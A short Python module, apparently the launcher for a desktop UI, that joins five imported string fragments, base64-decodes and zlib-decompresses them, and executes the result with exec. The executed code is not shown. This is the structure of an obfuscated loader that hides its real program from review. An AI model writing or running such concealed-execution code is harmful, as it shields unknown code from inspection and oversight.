from __future__ import annotations
import base64
import zlib
from _classic_ui_part00 import PART as P0
from _classic_ui_part01 import PART as P1
from _classic_ui_part02 import PART as P2
from _classic_ui_part03 import PART as P3
from _classic_ui_part04 import PART as P4

_payload = P0 + P1 + P2 + P3 + P4
_source = zlib.decompress(base64.b64decode(_payload))
exec(compile(_source, '<yomceph_desktop_v130_classic>', 'exec'))
